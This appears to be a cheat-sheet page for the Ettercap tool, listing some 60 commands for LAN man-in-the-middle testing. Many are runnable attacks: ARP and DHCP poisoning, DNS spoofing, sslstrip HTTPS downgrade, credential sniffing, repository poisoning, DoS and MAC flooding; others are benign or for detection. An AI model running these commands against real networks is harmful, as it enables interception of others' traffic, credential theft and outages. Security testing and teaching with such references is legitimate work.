# Ettercap

> A suite for man-in-the-middle attacks on LANs: ARP poisoning, sniffing and content filtering, for authorised testing.

- Category: Traffic Analysis
- Commands: 60
- Page: https://terminal.rokibulroni.com/tool/traffic/ettercap
- Homepage: https://www.ettercap-project.org
- Documentation: https://linux.die.net/man/8/ettercap
- Tags: MITM, ARP spoofing, sniffing

## Install

- apt: `sudo apt install ettercap-text-only`
- brew: `brew install ettercap`

## Basic Usage

### ettercap --help

```bash
ettercap --help
```

Displays the help screen listing all available command-line options and flags.

### ettercap --version

```bash
ettercap --version
```

Prints the installed Ettercap version and build information.


## Interface Selection

### ettercap -I

```bash
ettercap -I
```

Lists all available network interfaces that Ettercap can utilize for sniffing.


## Basic Passive Sniffing

### ettercap -T -i eth0

```bash
ettercap -T -i eth0
```

Starts Ettercap in text-only mode on the specified interface without a graphical interface.

### ettercap -C -i eth0

```bash
ettercap -C -i eth0
```

Launches Ettercap in Curses mode, providing a semi-interactive text-based user interface.


## Text, Curses, and Daemon Modes

### ettercap -D -i eth0

```bash
ettercap -D -i eth0
```

Runs Ettercap in daemon mode as a background process.


## Quiet, Verbose, and Debug Modes

### ettercap -T -q -i eth0

```bash
ettercap -T -q -i eth0
```

Runs in text mode but suppresses packet content decoding, printing only captured credentials.

### ettercap -T -z -i eth0

```bash
ettercap -T -z -i eth0
```

Starts in silent mode, suppressing output of startup messages and statistics.


## Promiscuous Mode Control

### ettercap -T -p -i eth0

```bash
ettercap -T -p -i eth0
```

Disables promiscuous mode, processing only packets addressed to the sniffing interface.


## Blue Team Detection and Validation

### ettercap -T -u -i eth0

```bash
ettercap -T -u -i eth0
```

Runs in unoffensive mode, preventing the tool from forwarding packets, useful for passive validation.


## Basic Passive Sniffing

### ettercap -T -i eth0 -n 192.168.1.0/24

```bash
ettercap -T -i eth0 -n 192.168.1.0/24
```

Sniffs traffic strictly on the specified network mask, ignoring other packets.

### ettercap -T -i eth0 -R

```bash
ettercap -T -i eth0 -R
```

Reverses packet matching logic, capturing only traffic that does NOT match target specifications.


## Logging and Output Files

### ettercap -T -i eth0 -w traffic.pcap

```bash
ettercap -T -i eth0 -w traffic.pcap
```

Captures sniffed traffic and writes it to a standard pcap file for later analysis.

### ettercap -T -r traffic.pcap

```bash
ettercap -T -r traffic.pcap
```

Reads and analyzes packets from an existing pcap file instead of a live interface.

### ettercap -T -i eth0 -L logfile

```bash
ettercap -T -i eth0 -L logfile
```

Logs all capturing information and traffic details to binary log files prefixed with 'logfile'.

### ettercap -T -i eth0 -m messages.log

```bash
ettercap -T -i eth0 -m messages.log
```

Logs only the internal Ettercap messages and alerts to a text file.


## Bridged Sniffing

### ettercap -T -B eth0 eth1

```bash
ettercap -T -B eth0 eth1
```

Starts bridged sniffing between two interfaces, allowing traffic inspection as a transparent bridge.

### ettercap -T -B eth0 eth1 -u

```bash
ettercap -T -B eth0 eth1 -u
```

Runs bridged mode unoffensively, dropping packets instead of forwarding them (simulates a broken cable).


## IPv4 and IPv6 Attacks

### ettercap -T -6 -i eth0

```bash
ettercap -T -6 -i eth0
```

Forces the decoding and handling of IPv6 packets explicitly.


## Man in the Middle Techniques

### ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.1//

```bash
ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.1//
```

Performs a standard ARP poisoning MITM attack targeting a victim IP and the gateway.


## ARP Poisoning Attacks

### ettercap -T -M arp:remote:oneway -i eth0 /192.168.1.10// /192.168.1.1//

```bash
ettercap -T -M arp:remote:oneway -i eth0 /192.168.1.10// /192.168.1.1//
```

Executes one-way ARP poisoning, spoofing only from victim to gateway but not the reverse.


## Target Specification

### ettercap -T -M arp:remote -i eth0 // //

```bash
ettercap -T -M arp:remote -i eth0 // //
```

Targets every host in the subnet for ARP poisoning (global poisoning).


## ICMP Redirection

### ettercap -T -M icmp:00:11:22:33:44:55/10.0.0.1 -i eth0

```bash
ettercap -T -M icmp:00:11:22:33:44:55/10.0.0.1 -i eth0
```

Performs an ICMP redirection MITM attack spoofing the MAC and IP of a gateway.


## DHCP Spoofing

### ettercap -T -M dhcp:192.168.1.50,255.255.255.0,192.168.1.1 -i eth0

```bash
ettercap -T -M dhcp:192.168.1.50,255.255.255.0,192.168.1.1 -i eth0
```

Launches a DHCP spoofing attack, offering an IP, netmask, and DNS server to requesting clients.


## Port Stealing

### ettercap -T -M port:remote:tree -i eth0 /192.168.1.10//

```bash
ettercap -T -M port:remote:tree -i eth0 /192.168.1.10//
```

Uses Port Stealing MITM (useful where ARP is blocked) to intercept switch traffic using spanning tree.


## IPv4 and IPv6 Attacks

### ettercap -T -M ndp:remote -6 -i eth0 // //

```bash
ettercap -T -M ndp:remote -6 -i eth0 // //
```

Executes an IPv6 Neighbor Discovery Protocol (NDP) poisoning attack against all targets.


## Plugin Usage and Management

### ettercap -P list

```bash
ettercap -P list
```

Displays a list of all installed and available plugins.


## DNS Spoofing

### ettercap -T -M arp:remote -P dns_spoof -i eth0 /192.168.1.10// //

```bash
ettercap -T -M arp:remote -P dns_spoof -i eth0 /192.168.1.10// //
```

Combines ARP poisoning with the DNS spoofing plugin to resolve domains to an attacker-controlled IP.


## Red Team Network Attacks

### ettercap -T -M arp:remote -P isolate -i eth0 /192.168.1.10// //

```bash
ettercap -T -M arp:remote -P isolate -i eth0 /192.168.1.10// //
```

Uses the isolate plugin during ARP poisoning to completely cut off the victim's LAN internet access.


## Advanced and Combined Real World Scenarios

### ettercap -T -M arp:remote -P autoadd -i eth0

```bash
ettercap -T -M arp:remote -P autoadd -i eth0
```

Automatically adds new hosts discovered on the network to the ARP poisoning target list dynamically.


## Credential Sniffing

### ettercap -T -M arp:remote -i eth0 -P remote_browser

```bash
ettercap -T -M arp:remote -i eth0 -P remote_browser
```

Sniffs URLs visited by the victim and logs them using the remote browser plugin.


## SSL and HTTPS Interception

### ettercap -T -M arp:remote -i eth0 -S

```bash
ettercap -T -M arp:remote -i eth0 -S
```

Runs ARP poisoning but explicitly disables SSL/SSH dissection (useful to avoid certificate warnings).


## Filter Compilation and Usage

### etterfilter myfilter.ecf -o myfilter.ef

```bash
etterfilter myfilter.ecf -o myfilter.ef
```

Compiles a human-readable filter source file into a binary filter file usable by Ettercap.

### ettercap -T -M arp:remote -i eth0 -F myfilter.ef

```bash
ettercap -T -M arp:remote -i eth0 -F myfilter.ef
```

Loads a compiled filter to modify, drop, or log packets during the MITM attack.


## Packet Modification and Injection

### ettercap -T -i eth0 -F drop_tcp.ef

```bash
ettercap -T -i eth0 -F drop_tcp.ef
```

Applies a specific filter to drop TCP packets matching defined criteria while sniffing.


## Incident Response Simulation

### ettercap -T -i eth0 -P search_promisc

```bash
ettercap -T -i eth0 -P search_promisc
```

Uses a plugin to scan the local network for other network interfaces running in promiscuous mode.

### ettercap -T -i eth0 -P scan_poisoner

```bash
ettercap -T -i eth0 -P scan_poisoner
```

Actively checks if anyone on the network is performing ARP poisoning against the host.


## Automation and Script Friendly Usage

### ettercap -T -q -i eth0 -M arp:remote // // -P autoadd &

```bash
ettercap -T -q -i eth0 -M arp:remote // // -P autoadd &
```

Runs a quiet, global ARP poisoning attack in the background with auto-target addition.


## Protocol Dissectors

### ettercap -T -i eth0 -p

```bash
ettercap -T -i eth0 -p
```

Sniffs in non-promiscuous mode, analyzing only packets sent to the machine's IP.


## Logging and Output Files

### ettercap -T -i eth0 -l /tmp/ettercap_info

```bash
ettercap -T -i eth0 -l /tmp/ettercap_info
```

Logs passive information about discovered hosts and ports to the specified file path.


## Host Management

### ettercap -T -i eth0 -j hosts.list

```bash
ettercap -T -i eth0 -j hosts.list
```

Loads a list of hosts from a file instead of scanning the network at startup.

### ettercap -T -i eth0 -k hosts.list

```bash
ettercap -T -i eth0 -k hosts.list
```

Saves the list of discovered hosts to a file upon exit.


## Visualisation

### ettercap -T -i eth0 -V

```bash
ettercap -T -i eth0 -V
```

Visualizes the format of packets in text mode to understand decoding structure.


## Packet Modification and Injection

### ettercap -T -i eth0 -e '192.168.1.1'

```bash
ettercap -T -i eth0 -e '192.168.1.1'
```

Injects a regex into the visualizer to highlight specific packet data containing the IP string.


## Red Team Network Attacks

### ettercap -T -M arp:remote -P chk_poison -i eth0

```bash
ettercap -T -M arp:remote -P chk_poison -i eth0
```

Verifies if the ARP poisoning attack is successful on the victim side.


## Credential Sniffing

### ettercap -T -i eth0 -P mdns_spoof

```bash
ettercap -T -i eth0 -P mdns_spoof
```

Spoofs Multicast DNS (mDNS) responses to intercept local name resolution traffic.

### ettercap -T -M arp:remote -i eth0 -P nbns_spoof

```bash
ettercap -T -M arp:remote -i eth0 -P nbns_spoof
```

Spoofs NetBIOS Name Service (NBNS) queries to redirect Windows network traffic.


## SSL and HTTPS Interception

### ettercap -T -M arp:remote -i eth0 -P sslstrip

```bash
ettercap -T -M arp:remote -i eth0 -P sslstrip
```

Uses the SSLStrip plugin to downgrade HTTPS connections to HTTP for plaintext sniffing.


## Advanced and Combined Real World Scenarios

### ettercap -T -M arp:remote -i eth0 -P repo_poison

```bash
ettercap -T -M arp:remote -i eth0 -P repo_poison
```

Redirects Linux package manager traffic to a fake repository during an update.

### ettercap -T -M arp:remote -i eth0 -P dos_attack

```bash
ettercap -T -M arp:remote -i eth0 -P dos_attack
```

Runs a Denial of Service attack against a specific victim using the plugin interface.


## Session Hijacking Techniques

### ettercap -T -i eth0 -F replace_img.ef

```bash
ettercap -T -i eth0 -F replace_img.ef
```

Uses a filter to replace image data in HTTP streams with a custom image.


## Target Specification

### ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.20//

```bash
ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.20//
```

Performs ARP poisoning between two specific clients, excluding the gateway.

### ettercap -T -M arp:remote -i eth0 /192.168.1.10/21,22,80,443/

```bash
ettercap -T -M arp:remote -i eth0 /192.168.1.10/21,22,80,443/
```

Targets a specific IP but only on FTP, SSH, HTTP, and HTTPS ports.


## Red Team Network Attacks

### ettercap -T -q -M arp:remote -i eth0 -P rand_flood

```bash
ettercap -T -q -M arp:remote -i eth0 -P rand_flood
```

Floods the LAN with random MAC addresses to overflow switch CAM tables.


## Blue Team Detection and Validation

### ettercap -T -i eth0 -P find_conn

```bash
ettercap -T -i eth0 -P find_conn
```

Enumerates all active connections on the LAN to map current communication flows.

### ettercap -T -i eth0 -P find_ettercap

```bash
ettercap -T -i eth0 -P find_ettercap
```

Attempts to detect other instances of Ettercap running on the network.

### ettercap -T -i eth0 -P fingerprint

```bash
ettercap -T -i eth0 -P fingerprint
```

Passively fingerprints the operating systems of remote hosts based on traffic analysis.


## Advanced and Combined Real World Scenarios

### ettercap -G

```bash
ettercap -G
```

Launches the GTK+ graphical interface (useful for beginners or visualization).

### ettercap -T -i eth0 --script commands.ett

```bash
ettercap -T -i eth0 --script commands.ett
```

Executes a sequence of Ettercap commands defined in an external script file.


## Wireless Related Attacks

### ettercap -T -i wlan0 -M arp:remote // //

```bash
ettercap -T -i wlan0 -M arp:remote // //
```

Performs ARP poisoning on a wireless interface (Standard WiFi MITM).

## Related tools

- [tcpdump](https://terminal.rokibulroni.com/tool/traffic/TCPDump)
- [TShark](https://terminal.rokibulroni.com/tool/traffic/tshark)
- [arp-scan](https://terminal.rokibulroni.com/tool/network/arp-scan)
